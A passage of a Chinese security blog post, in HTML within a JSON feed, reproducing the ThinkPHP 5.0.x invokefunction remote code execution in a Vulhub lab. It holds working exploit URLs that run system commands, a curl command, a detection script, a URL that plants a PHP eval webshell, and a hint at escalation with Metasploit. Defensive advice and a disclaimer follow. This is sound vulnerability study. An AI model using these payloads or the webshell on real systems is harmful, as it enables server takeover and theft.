及以下版本中，框架未对这些调用进行严格的权限校验，导致攻击者可以通过构造特定参数，调用任意 PHP 函数（如 <code>call_user_func_array</code>），并传递函数名和参数，从而触发远程代码执行。</p>\n<h3 id=\"核心问题\"><a href=\"#核心问题\" class=\"headerlink\" title=\"核心问题\"></a>核心问题</h3><ul>\n<li><strong>动态函数调用</strong>：<code>call_user_func_array</code> 允许动态调用任意 PHP 函数（如 <code>phpinfo</code>、<code>system</code> 等）。</li>\n<li><strong>参数未过滤</strong>：用户输入的 <code>vars[0]</code>（函数名）和 <code>vars[1][]</code>（函数参数）直接传递到函数执行器，未经严格验证。</li>\n<li><strong>路由暴露</strong>：通过 <code>s=/Index/\\think\\app/invokefunction</code>，攻击者可直接访问框架核心类。</li>\n</ul>\n<h3 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h3><ul>\n<li>执行任意 PHP 代码</li>\n<li>运行系统命令，获取权限</li>\n<li>上传 WebShell，长期控制服务器</li>\n<li>窃取配置文件、数据库信息</li>\n<li>删除文件或修改系统配置</li>\n</ul>\n<hr>\n<h2 id=\"四、漏洞利用演示\"><a href=\"#四、漏洞利用演示\" class=\"headerlink\" title=\"四、漏洞利用演示\"></a>四、漏洞利用演示</h2><p>以下展示如何利用 ThinkPHP 5.x RCE 漏洞，基于 Vulhub 靶场环境。</p>\n<h3 id=\"1-测试-PHP-函数调用\"><a href=\"#1-测试-PHP-函数调用\" class=\"headerlink\" title=\"1. 测试 PHP 函数调用\"></a>1. 测试 PHP 函数调用</h3><p>访问以下 Payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数解析</strong>：</p>\n<ul>\n<li><code>s=/Index/\\think\\app/invokefunction</code>：指定路由</li>\n<li><code>function=call_user_func_array</code>：调用函数</li>\n<li><code>vars[0]=phpinfo</code>：目标函数</li>\n<li><code>vars[1][]=1</code>：参数（执行 phpinfo(1)）</li>\n</ul>\n<p><strong>结果</strong>：</p>\n<p>页面显示 phpinfo 配置信息，说明漏洞存在 </p>\n<h3 id=\"2-执行系统命令\"><a href=\"#2-执行系统命令\" class=\"headerlink\" title=\"2. 执行系统命令\"></a>2. 执行系统命令</h3><p>执行 <code>whoami</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果示例</strong>：</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span><br></code></pre></td></tr></table></figure>\n\n<p>表示系统命令执行成功。</p>\n<h3 id=\"其他命令测试：\"><a href=\"#其他命令测试：\" class=\"headerlink\" title=\"其他命令测试：\"></a>其他命令测试：</h3><ul>\n<li><p>查看用户 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>列出目录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20/<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>查看网络配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ifconfig<br></code></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"3-使用-Curl-测试\"><a href=\"#3-使用-Curl-测试\" class=\"headerlink\" title=\"3. 使用 Curl 测试\"></a>3. 使用 Curl 测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">curl <span class=\"hljs-string\">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\\\think\\\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：URL 中的 <code>\\</code> 要写成 <code>\\\\</code></p>\n</blockquote>\n<h3 id=\"4-使用-Burp-Suite-测试\"><a href=\"#4-使用-Burp-Suite-测试\" class=\"headerlink\" title=\"4. 使用 Burp Suite 测试\"></a>4. 使用 Burp Suite 测试</h3><ul>\n<li>在浏览器中访问目标页面，拦截请求</li>\n<li>将 Payload 粘贴进 Repeater 中测试</li>\n<li>修改 <code>vars[1][]</code> 的值如 <code>id</code>、<code>ls</code> 等</li>\n</ul>\n<hr>\n<h2 id=\"五、Payload-结构总结\"><a href=\"#五、Payload-结构总结\" class=\"headerlink\" title=\"五、Payload 结构总结\"></a>五、Payload 结构总结</h2><table>\n<thead>\n<tr>\n<th>参数键</th>\n<th>功能说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>s</code></td>\n<td>请求路由，指向 ThinkPHP 核心类</td>\n</tr>\n<tr>\n<td><code>function</code></td>\n<td>要调用的 PHP 函数（如 <code>call_user_func_array</code>）</td>\n</tr>\n<tr>\n<td><code>vars[0]</code></td>\n<td>执行的函数名称（如 <code>phpinfo</code>, <code>system</code>）</td>\n</tr>\n<tr>\n<td><code>vars[1][]</code></td>\n<td>函数的参数数组（如 <code>whoami</code>, <code>id</code>）</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"六、防御措施\"><a href=\"#六、防御措施\" class=\"headerlink\" title=\"六、防御措施\"></a>六、防御措施</h2><ol>\n<li><p><strong>升级 ThinkPHP 版本</strong></p>\n<p>升级至 ThinkPHP 5.0.24 或更高版本。</p>\n</li>\n<li><p><strong>输入验证与过滤</strong></p>\n<ul>\n<li>白名单验证 <code>s</code> 参数</li>\n<li>禁用危险函数如 <code>call_user_func_array</code></li>\n<li>严格过滤所有用户输入参数</li>\n</ul>\n</li>\n<li><p><strong>禁用危险函数</strong></p>\n<p>在 <code>php.ini</code> 中：</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">disable_functions = <span class=\"hljs-keyword\">eval</span>,<span class=\"hljs-keyword\">exec</span>,<span class=\"hljs-keyword\">system</span>,passthru,shell_exec,proc_open,call_user_func_array<br></code></pre></td></tr></table></figure>\n</li>\n<li><p><strong>最小权限原则</strong></p>\n<p>Web 服务运行用户不要使用 <code>root</code>，限制文件访问权限。</p>\n</li>\n<li><p><strong>部署 WAF</strong></p>\n<p>拦截请求中包含敏感函数或路径的攻击尝试。</p>\n</li>\n<li><p><strong>安全审计与监控</strong></p>\n<p>定期扫描、日志审计，发现异常行为。</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"七、笔记总结\"><a href=\"#七、笔记总结\" class=\"headerlink\" title=\"七、笔记总结\"></a>七、笔记总结</h2><table>\n<thead>\n<tr>\n<th>内容项</th>\n<th>信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>漏洞类型</td>\n<td>RCE（远程代码执行）</td>\n</tr>\n<tr>\n<td>影响版本</td>\n<td>ThinkPHP 5.0.x 至 5.0.23</td>\n</tr>\n<tr>\n<td>漏洞原因</td>\n<td>动态函数调用缺乏授权校验</td>\n</tr>\n<tr>\n<td>复现方式</td>\n<td>URL GET 请求构造 Payload</td>\n</tr>\n<tr>\n<td>环境工具</td>\n<td>Vulhub、Docker、Kali Linux</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"八、附加玩法\"><a href=\"#八、附加玩法\" class=\"headerlink\" title=\"八、附加玩法\"></a>八、附加玩法</h2><h3 id=\"自动化检测脚本\"><a href=\"#自动化检测脚本\" class=\"headerlink\" title=\"自动化检测脚本\"></a>自动化检测脚本</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><br>url = <span class=\"hljs-string\">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\\\think\\\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br>response = requests.get(url)<br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;www-data&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Vulnerability found!&quot;</span>)<br><span class=\"hljs-keyword\">else</span>:<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;No vulnerability detected.&quot;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"上传-WebShell\"><a href=\"#上传-WebShell\" class=\"headerlink\" title=\"上传 WebShell\"></a>上传 WebShell</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php<br></code></pre></td></tr></table></figure>\n\n<p>使用蚁剑连接：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\">http:<span class=\"hljs-comment\">//192.168.56.102:8080/shell.php</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"提权尝试\"><a href=\"#提权尝试\" class=\"headerlink\" title=\"提权尝试\"></a>提权尝试</h3><p>结合弱口令、提权漏洞等，可使用 Metasploit 等工具进一步入侵。</p>\n<hr>\n<h2 id=\"九、总结\"><a href=\"#九、总结\" class=\"headerlink\" title=\"九、总结\"></a>九、总结</h2><p>ThinkPHP 5.x RCE 漏洞是一个典型的动态函数调用漏洞，利用简单但危害极大。通过 Vulhub 靶场，我们可以快速复现漏洞，深入理解其原理和利用方式。</p>\n<p>开发者应及时升级框架版本，实施严格的输入验证和权限控制，部署 WAF 和监控机制，以降低漏洞被利用的风险。</p>\n<p>希望本文能帮助读者更好地理解和防范 ThinkPHP RCE 漏洞，同时提升 Web 应用安全开发的意识！</p>\n<hr>\n<h2 id=\"⚠️-免责声明\"><a href=\"#⚠️-免责声明\" class=\"headerlink\" title=\"⚠️ 免责声明\"></a>⚠️ 免责声明</h2><p>本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。</p>\n",
            "tags": [
                "Web安全",
                "RCE",
                "漏洞复现",
                "ThinkPHP"
            ]
        }
    ]
}